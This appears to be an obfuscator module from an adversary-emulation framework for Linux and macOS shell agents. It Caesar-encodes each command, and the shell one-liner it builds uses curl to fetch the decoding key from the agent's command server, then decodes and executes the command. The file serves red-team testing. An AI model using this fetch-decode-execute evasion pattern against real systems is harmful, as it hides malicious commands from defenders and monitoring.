from random import randint

from app.utility.base_obfuscator import BaseObfuscator


class Obfuscation(BaseObfuscator):

    @property
    def supported_platforms(self):
        return dict(
            darwin=['sh'],
            linux=['sh']
        )

    def __init__(self, agent):
        self.agent = agent

    """ EXECUTORS """

    def sh(self, link):
        decrypted = self.decode_bytes(link.command)
        encrypted, shift = self._apply_cipher(decrypted)
        link.pin = shift
        return '(shift=$(curl -s -X POST -H "Content-Type: application/json" ' \
               + self.agent.server+'/internals -d \'{"link":"%s"}\' -H "property:pin"); ' \
                                   '$(python -c "print(\'\'.join([chr(ord(c)+-$shift) if c.isalnum() else c for c in \'%s\' ]))");)' % (link.unique, encrypted)

    """ PRIVATE """

    @staticmethod
    def _apply_cipher(s, bounds=20):
        """
        Encode a command with a simple caesar cipher
        :param s: the string to encode
        :param bounds: the number of unicode code points to shift
        :return: a tuple containing the encoded command and the shift value
        """
        shift = 0
        while shift == 0:
            shift = randint(-bounds, bounds)
        return ''.join([chr(ord(c)+shift) if c.isalnum() else c for c in s]), shift
